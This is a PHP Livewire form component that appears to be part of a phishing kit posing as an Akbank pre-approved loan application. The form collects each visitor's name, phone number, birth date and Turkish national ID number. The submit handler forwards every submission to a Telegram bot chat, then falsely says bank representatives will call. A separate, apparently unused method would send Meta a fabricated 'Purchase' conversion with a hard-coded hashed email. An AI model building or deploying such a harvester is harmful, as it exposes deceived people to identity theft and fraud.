<?php

namespace App\Livewire;

use Livewire\Component;
use GuzzleHttp\Client;
use App\Models\Basvuru;

// Meta integration
use FacebookAds\Api;
use FacebookAds\Logger\CurlLogger;
use FacebookAds\Object\ServerSide\Content;
use FacebookAds\Object\ServerSide\CustomData;
use FacebookAds\Object\ServerSide\DeliveryCategory;
use FacebookAds\Object\ServerSide\Event;
use FacebookAds\Object\ServerSide\EventRequest;
use FacebookAds\Object\ServerSide\Gender;
use FacebookAds\Object\ServerSide\UserData;

class UserForm extends Component
{
    public $ad;
    public $email;
    public $telefon;
    public $dogumTarihi;
    public $musteriMi;
    public $tcKimlik;

    protected $rules = [
        "ad" => "required|min:3|max:40",
        "telefon" => 'required|regex:/^5[0-9]{9}$/',
        "dogumTarihi" => "required|date|before:2000-01-01",
        "musteriMi" => "required|boolean",
        "tcKimlik" => "required|digits:11",
    ];

    protected $validationAttributes = [
        "ad" => "Ad Soyad",
        "telefon" => "Telefon Numarası",
        "dogumTarihi" => "Doğum Tarihi",
        "musteriMi" => "Akbank Müşterisi",
        "tcKimlik" => "TC Kimlik Numarası",
    ];

    protected $messages = [
        "ad.required" => "Ad Soyad alanı zorunludur.",
        "ad.min" => "Ad Soyad en az :min karakter olmalıdır.",
        "ad.max" => "Ad Soyad en fazla :max karakter olmalıdır.",
        "telefon.required" => "Telefon Numarası alanı zorunludur.",
        "telefon.size" => "Telefon Numarası 10 haneli olmalıdır.",
        "telefon.regex" =>
            "Geçersiz telefon numarası, lütfen düzelterek tekrar deneyiniz.",
        "dogumTarihi.required" => "Doğum Tarihi alanı zorunludur.",
        "dogumTarihi.date" => "Doğum Tarihi geçerli bir tarih olmalıdır.",
        "dogumTarihi.before" => "Doğum Tarihi 2000'den büyük olamaz.",
        "musteriMi.required" =>
            "Akbank Müşterisi alanı doldurulmak zorundadır.",
        "musteriMi.boolean" =>
            "Akbank Müşterisi alanı geçerli bir değer olmalıdır.",
        "tcKimlik.required" => "TC Kimlik Numarası alanı zorunludur.",
        "tcKimlik.digits" => "TC Kimlik Numarası 11 haneli olmalıdır.",
        "tcKimlik.invalid" => "TC Kimlik Numarası geçersizdir.",
    ];

    public function updated($propertyName)
    {
        $this->validateOnly($propertyName);

        if (
            $propertyName === "tcKimlik" &&
            !$this->isValidTcKimlik($this->tcKimlik)
        ) {
            $this->addError("tcKimlik", "TC Kimlik Numarası geçersizdir.");
        }
    }

    public function submit(): void
    {
        $this->validate();

        if (!$this->isValidTcKimlik($this->tcKimlik)) {
            $this->addError("tcKimlik", "TC Kimlik Numarası geçersizdir.");
            return;
        }

        $this->telefon = preg_replace("/[^0-9]/", "", $this->telefon);
        $this->tcKimlik = preg_replace("/[^0-9]/", "", $this->tcKimlik);

        $checkResults = $this->checkIfExists($this->telefon, $this->tcKimlik);

        if ($checkResults["telefon"] || $checkResults["tcKimlik"]) {
            if ($checkResults["telefon"]) {
                $this->addError(
                    "telefon",
                    "Bu telefon numarasına sahip müşterinin başvurusu daha önce alınmıştır."
                );
            }
            if ($checkResults["tcKimlik"]) {
                $this->addError(
                    "tcKimlik",
                    "Bu TC Kimlik Numarasına sahip müşterinin başvurusu daha önce alınmıştır."
                );
            }
        } else {
            Basvuru::create([
                "ad" => $this->ad,
                "telefon" => $this->telefon,
                "dogum_tarihi" => $this->dogumTarihi,
                "musteri_mi" => $this->musteriMi,
                "tc_kimlik" => $this->tcKimlik,
            ]);

            try {
                $this->sendTelegramMessage();
            } catch (\Exception $e) {
                session()->flash(
                    "message",
                    "Başvuru oluşturulurken bir hata oluştu, lütfen daha sonra tekrar deneyiniz!"
                );
            }

            session()->flash(
                "message",
                "Ön onaylı ihtiyaç kredisi başvurunuz başarıyla alınmıştır. AKBANK Müşteri temsilcileri, kısa süre içerisinde sizinle bankamızda kayıtlı cep telefonu numaranızdan iletişime geçecektir."
            );

            $this->reset();
        }
    }

    private function isValidTcKimlik($tcKimlik): bool
    {
        if (strlen($tcKimlik) != 11 || $tcKimlik[0] == "0") {
            return false;
        }

        $oddSum = array_sum(
            str_split(
                $tcKimlik[0] .
                    $tcKimlik[2] .
                    $tcKimlik[4] .
                    $tcKimlik[6] .
                    $tcKimlik[8]
            )
        );
        $evenSum = array_sum(
            str_split($tcKimlik[1] . $tcKimlik[3] . $tcKimlik[5] . $tcKimlik[7])
        );

        $digit10 = (7 * $oddSum - $evenSum) % 10;
        if ($digit10 != $tcKimlik[9]) {
            return false;
        }

        $totalSum = array_sum(str_split(substr($tcKimlik, 0, 10)));
        $digit11 = $totalSum % 10;
        return $digit11 == $tcKimlik[10];
    }

    private function sendMetaEvent(): void
    {
        $access_token = env("META_ACCESS_TOKEN");
        $pixel_id = env("META_PIXEL_ID");

        // Initialize
        Api::init(null, null, $access_token);
        $api = Api::instance();
        $api->setLogger(new CurlLogger());

        $events = [];

        $user_data_0 = (new UserData())
            ->setEmails([
                "7b17fb0bd173f625b58636fb796407c22b3d16fc78302d79f0fd30c2fc2fc068",
            ])
            ->setPhones([]);

        $custom_data_0 = (new CustomData())
            ->setValue(142.52)
            ->setCurrency("USD");

        $event_0 = (new Event())
            ->setEventName("Purchase")
            ->setEventTime(1730119129)
            ->setUserData($user_data_0)
            ->setCustomData($custom_data_0)
            ->setActionSource("website");
        array_push($events, $event_0);

        $request = (new EventRequest($pixel_id))->setEvents($events);

        $request->execute();
    }

    private function sendTelegramMessage(): void
    {
        $botApiKey = env("TG_BOT_APIKEY");
        $chatId = env("TG_CHAT_ID");

        if (!$botApiKey || !$chatId) {
            throw new \Exception(
                "Telegram bot API key or chat ID is missing in environment variables."
            );
        }

        $client = new Client();
        $message =
            "📋 *Yeni Başvuru Formu* 📋\n\n" .
            "👤 *Ad Soyad:* $this->ad\n" .
            "📞 *Telefon Numarası:* $this->telefon\n" .
            "📅 *Doğum Tarihi:* $this->dogumTarihi\n" .
            "🏦 *Akbank Müşterisi:* " .
            ($this->musteriMi ? "Evet" : "Hayır") .
            "\n" .
            "🆔 *TC Kimlik Numarası:* $this->tcKimlik\n";

        $client->post("https://api.telegram.org/bot{$botApiKey}/sendMessage", [
            "json" => [
                "chat_id" => $chatId,
                "text" => $message,
                "parse_mode" => "Markdown",
            ],
        ]);
    }

    private function checkIfExists($telefon, $tcKimlik): array
    {
        return [
            "telefon" => Basvuru::where("telefon", $telefon)->exists(),
            "tcKimlik" => Basvuru::where("tc_kimlik", $tcKimlik)->exists(),
        ];
    }

    public function render()
    {
        return view("livewire.user-form");
    }
}
